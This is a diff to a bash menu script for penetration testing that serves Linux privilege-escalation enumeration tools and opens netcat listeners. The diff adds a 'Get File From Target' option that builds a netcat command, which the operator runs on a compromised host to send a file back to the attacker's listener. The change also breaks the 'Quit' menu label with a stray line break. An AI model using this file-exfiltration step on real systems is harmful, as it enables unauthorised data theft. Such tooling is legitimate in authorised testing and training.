@@ -14,6 +14,7 @@ GREEN='\033[1;32m'
 PURP='\033[1;35m'
 deps=('xsel')
 currServerPath=""
+GIP=""
 echo -e "$BLUE
                                                                                                                    
        db         88           88                  888b      88                       88                           
@@ -73,9 +74,18 @@ function copyToClip(){
     echo "$1" | xsel -ib
 }
 
+# Get Python HTTP.server Path
+
 function getServerIP(){
    IP=$(hostname -I | awk '{print $1}')
     currServerPath="http://$IP:8000" 
+}
+
+# Get FileUpload Path
+
+function getFileIP(){
+   IP=$(hostname -I | awk '{print $1}')
+    GIP="$IP" 
 }
 
 
@@ -99,7 +109,7 @@ function http () {
 pwd=$('pwd')
 PS3='
 Please enter your choice: '
-options=("Start HTTP Server" "Open NetCat Listener" "Lin Peas Server" "LinSmartPE Server" "LinEnum Server" "Quit")
+options=("Start HTTP Server" "Open NetCat Listener" "Lin Peas Server" "LinSmartPE Server" "LinEnum Server" "Get File From Target" "Quit")
 select opt in "${options[@]}"
 do
     case $opt in
@@ -135,7 +145,7 @@ do
             python3 -m http.server --directory "$pwd/lib/LSE/"
             echo -e "$GREEN "
             ;;  
-          "LinEnum Server")
+        "LinEnum Server")
             echo -e "$PURP"
             echo -e "you chose choice $REPLY which is $opt"
             getServerIP
@@ -144,7 +154,21 @@ do
             python3 -m http.server --directory "$pwd/lib/linEnum/"
             echo -e "$GREEN "
             ;; 
-        "Quit")
+        "Get File From Target")
+            echo -e "$PURP"
+            echo -e "you chose choice $REPLY which is $opt"
+            echo -e "Choose Output Filename:"
+            read outputFile
+            getFileIP
+            command="nc -w 3 $GIP 9886 < filename"
+            copyToClip "$command"
+            nc -l -p 9886 > "$outputFile"
+            echo -e "$RED"
+            echo -e "File Saved as: $outputFile"
+            echo -e "$GREEN "
+            ;; 
+        "
+        Quit")
             break
             ;;
         *) echo echo -e "$RED invalid option $REPLY";;
